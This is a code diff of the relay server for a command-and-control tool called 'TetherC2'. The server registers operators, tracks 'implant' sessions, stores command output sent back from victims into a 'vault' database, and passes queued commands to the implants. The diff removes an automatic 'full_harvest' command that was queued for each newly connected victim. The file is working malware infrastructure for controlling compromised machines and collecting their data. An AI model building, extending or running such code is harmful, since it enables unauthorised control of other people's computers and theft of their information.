@@ -1,4 +1,4 @@
-# relay_server.py (Full Code - Corrected for Root Deployment)
+# relay_server.py (Full Code - Simplified for Stability)
 import sqlite3
 import json
 import time
@@ -27,9 +27,7 @@ def register():
     username, password = data.get('username'), data.get('password')
     if not all([username, password]) or len(password) < 4:
         return jsonify({"success": False, "error": "Username and a password (min 4 chars) are required."}), 400
-    
     if db.create_user(username, generate_password_hash(password)):
-        print(f"[RELAY] New user registered: {username}")
         return jsonify({"success": True, "message": "Account created successfully."})
     else:
         return jsonify({"success": False, "error": "Username already exists."}), 409
@@ -39,8 +37,8 @@ def login():
     data = request.json
     username, password = data.get('username'), data.get('password')
     user = db.get_user(username)
-    if user and check_password_hash(user[1], password): # user[1] is the password_hash column
-        return jsonify({"success": True, "username": user[0]}) # user[0] is the username column
+    if user and check_password_hash(user[1], password):
+        return jsonify({"success": True, "username": user[0]})
     else:
         return jsonify({"success": False, "error": "Invalid username or password."}), 401
 
@@ -58,16 +56,15 @@ def handle_implant_hello():
         active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), **metadata}
         if is_new_session: print(f"[RELAY] New session online from user '{c2_user}': {session_id}")
     
+    # Store any results the payload might send (e.g., from a manual command)
     if "results" in data:
         for result in data.get("results", []):
             if "command" in result and "output" in result:
                 db.save_vault_data(session_id, result["command"], result["output"])
     
+    # Send any queued commands
     with cmd_lock:
-        if is_new_session:
-            command_queue.setdefault(c2_user, {}).setdefault(session_id, []).append({"action": "full_harvest", "params": {}})
         commands_to_execute = command_queue.get(c2_user, {}).pop(session_id, [])
-        
     return jsonify({"commands": commands_to_execute})
 
 @app.route('/implant/response', methods=['POST'])
@@ -113,5 +110,4 @@ def index(): return "TetherC2 Relay is operational."
 
 if __name__ == '__main__':
     print("[RELAY] TetherC2 Relay is operational.")
-    # This block is for local testing. Render will use a gunicorn command to run the app.
     app.run(host='0.0.0.0', port=5001)
